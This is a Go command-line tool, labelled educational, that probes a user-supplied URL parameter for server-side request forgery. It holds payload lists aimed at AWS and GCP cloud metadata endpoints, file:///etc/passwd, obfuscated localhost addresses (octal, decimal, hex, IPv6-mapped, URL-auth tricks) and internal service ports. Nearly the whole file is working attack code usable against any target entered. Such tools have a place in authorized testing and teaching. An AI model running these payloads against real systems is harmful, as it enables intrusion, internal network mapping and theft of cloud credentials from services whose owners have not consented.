package main

//required modules
import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

//main function
func main() {
	fmt.Println("SSRF & Backend Vulnerability Testing Tool (Educational Use Only)")
	fmt.Println("1. Test for basic SSRF")
	fmt.Println("2. Test for advanced SSRF (DNS rebinding, cloud metadata)")
	fmt.Println("3. Test for internal port scanning")
	fmt.Print("Select an option: ")

	reader := bufio.NewReader(os.Stdin)
	option, _ := reader.ReadString('\n')
	option = strings.TrimSpace(option)

	//start loop to test vulns
	switch option {
	case "1":
		testBasicSSRF()
	case "2":
		testAdvancedSSRF()
	case "3":
		testInternalPortScan()
	default:
		fmt.Println("Invalid option")
	}
}

//SSRF test
func testBasicSSRF() {
	fmt.Println("\nBasic SSRF Testing")
	fmt.Print("Enter target URL with parameter to test (e.g., http://example.com/image?url=): ")
	reader := bufio.NewReader(os.Stdin)
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	// Test with common SSRF payloads
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",          // AWS metadata
		"http://metadata.google.internal/computeMetadata/v1/", // GCP metadata
		"http://localhost:80/",                              // Localhost
		"file:///etc/passwd",                                // File access
		"http://127.0.0.1:22",                               // SSH port check
	}

	for _, payload := range payloads {
		testURL := targetURL + url.QueryEscape(payload)
		fmt.Printf("\nTesting payload: %s\n", payload)

		resp, err := http.Get(testURL)
		if err != nil {
			fmt.Printf("Request failed: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		fmt.Printf("Status: %d, Length: %d\n", resp.StatusCode, len(body))
		
		// Check for known responses
		if bytes.Contains(body, []byte("metadata")) || resp.StatusCode == 200 {
			fmt.Println("Possible SSRF vulnerability detected!")
			fmt.Printf("Response snippet: %.100s...\n", string(body))
		}
	}
}

func testAdvancedSSRF() {
	fmt.Println("\nAdvanced SSRF Testing")
	fmt.Print("Enter target URL with parameter to test: ")
	reader := bufio.NewReader(os.Stdin)
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	// Advanced SSRF techniques
	payloads := []string{
		"http://0177.0.0.1/",                // Octal IP
		"http://2130706433/",                 // Decimal IP
		"http://0x7f000001/",                 // Hex IP
		"http://example.com@169.254.169.254", // URL auth
		"http://example.com%23@169.254.169.254",
		"http://[::ffff:169.254.169.254]/",   // IPv6
	}

	for _, payload := range payloads {
		testURL := targetURL + url.QueryEscape(payload)
		fmt.Printf("\nTesting payload: %s\n", payload)

		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // Don't follow redirects
			},
		}

		resp, err := client.Get(testURL)
		if err != nil {
			fmt.Printf("Request failed: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		fmt.Printf("Status: %d, Length: %d\n", resp.StatusCode, len(body))
		
		if resp.StatusCode < 400 && len(body) > 0 {
			fmt.Println("Possible SSRF vulnerability detected!")
			fmt.Printf("Response snippet: %.100s...\n", string(body))
		}
	}
}

func testInternalPortScan() {
	fmt.Println("\nInternal Port Scanning Test")
	fmt.Print("Enter target URL with parameter to test: ")
	reader := bufio.NewReader(os.Stdin)
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	// Common internal ports to test
	ports := []string{"22", "80", "443", "3306", "5432", "6379", "8080", "9000"}

	//loop to test [prts according to input
	for _, port := range ports {
		payload := "http://127.0.0.1:" + port
		testURL := targetURL + url.QueryEscape(payload)
		fmt.Printf("\nTesting port: %s\n", port)

		client := &http.Client{
			Timeout: 5 * 1000000000, // 5 second timeout
		}

		resp, err := client.Get(testURL)
		if err != nil {
			fmt.Printf("Port %s: Connection failed (may be filtered)\n", port)
			continue
		}
		defer resp.Body.Close()

		fmt.Printf("Port %s: Status %d\n", port, resp.StatusCode)
		if resp.StatusCode < 500 {
			fmt.Printf("Port %s appears to be open!\n", port)
		}
	}
}
